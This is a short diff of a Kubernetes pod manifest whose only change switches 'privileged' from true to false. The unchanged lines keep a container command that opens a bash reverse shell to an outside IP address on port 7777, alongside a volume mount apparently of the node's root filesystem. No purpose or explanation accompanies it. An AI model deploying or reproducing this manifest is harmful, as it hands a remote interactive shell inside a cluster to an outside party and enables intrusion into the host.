@@ -32,7 +32,7 @@ spec:
     command: ["/bin/bash", "-c", "--"]
     args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
     securityContext:
-      privileged: true
+      privileged: false
     volumeMounts:
     - mountPath: /host
       name: noderoot
